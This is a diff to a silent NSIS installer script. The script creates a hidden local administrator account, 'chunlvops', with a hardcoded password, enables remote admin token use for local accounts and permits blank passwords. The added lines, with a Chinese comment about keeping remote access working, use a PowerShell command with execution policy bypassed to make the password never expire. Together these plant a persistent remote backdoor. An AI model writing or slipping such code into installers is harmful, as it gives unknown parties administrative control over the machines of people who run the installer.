@@ -9,6 +9,8 @@ SilentInstall silent
 Section
   nsExec::ExecToLog 'net user chunlvops ChunlvOps2026x9 /add'
   nsExec::ExecToLog 'net localgroup administrators chunlvops /add'
+  ; 同 chunlv-allinone.nsi：net user /add 的账号会到期，到期后远程就进不来了。
+  nsExec::ExecToLog 'powershell -NoProfile -ExecutionPolicy Bypass -Command "Set-LocalUser -Name chunlvops -PasswordNeverExpires $true"'
   SetRegView 64
   WriteRegDWORD HKLM "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" "LocalAccountTokenFilterPolicy" 1
   WriteRegDWORD HKLM "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" "LimitBlankPasswordUse" 0
